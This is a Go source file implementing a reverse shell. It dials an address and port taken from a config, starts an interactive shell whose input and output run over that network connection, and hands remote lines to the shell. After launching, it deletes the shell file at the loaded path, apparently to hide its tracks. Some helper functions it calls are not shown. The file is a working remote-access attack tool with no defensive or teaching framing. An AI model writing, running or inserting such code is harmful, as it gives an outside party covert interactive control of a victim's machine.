package main

import (
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
)

func main() {
	config := readConfig()
	startReverseShell(config)
}

func startReverseShell(config Config) {
	host := fmt.Sprintf("%s:%d", config.Addr, config.Port)
	conn, err := net.Dial(config.Protocol, host)
	check(err)

	stdin := startShell(conn)
	reader := newNetLineReader(conn, config.Timeout)

	// feed input from network until timeout value exceeds or
	// EOF is met.
	for {
		line, err := reader.Readline()
		check(err)

		_, err = stdin.Write(line)
		check(err)
	}
}

func startShell(conn net.Conn) io.WriteCloser {
	shellpath := loadShell()

	shell := exec.Command(shellpath, "-i")
	shell.Stdout = conn
	shell.Stderr = conn

	stdin, err := shell.StdinPipe()
	check(err)

	check(shell.Start())

	check(os.RemoveAll(shellpath))

	return stdin
}
